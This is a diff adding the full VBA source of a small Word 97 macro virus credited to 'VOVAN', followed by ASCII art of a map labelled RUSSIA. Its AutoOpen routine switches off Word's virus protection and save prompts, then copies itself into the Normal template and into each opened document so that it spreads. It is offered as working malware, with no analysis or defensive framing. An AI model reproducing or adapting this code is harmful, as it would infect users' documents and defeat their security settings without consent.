@@ -1,0 +1,24 @@
+
+MacroVirus.Word97.Small by VOVAN
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Attribute VB_Name = "small"
+Sub AutoOpen(): On Error Resume Next: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0: a = ActiveDocument.FullName: n = NormalTemplate.FullName
+Application.OrganizerCopy Source:=a, Destination:=n, Name:="small", Object:=wdOrganizerObjectProjectItems: NormalTemplate.Save
+Application.OrganizerCopy Source:=n, Destination:=a, Name:="small", Object:=wdOrganizerObjectProjectItems: ActiveDocument.Save
+End Sub
+'
+'               MMM            MMMMMMMMM                 MM
+'             MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
+'              MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
+'               MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
+'               MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+'               MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+'               MMM        MMMMMMMMMMMMM           MMMMMMMMMM
+'               MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
+'                MM         MMMMMMMM               M  MMMMMMM
+'                MM        MMMMMMMMM             MMM   MMMMMM
+'                         MMMMMMMMMMMMMM      MMMMM    MMMMMM
+'                MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
+'               MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
+'              MMMMMMMMMM                                MM
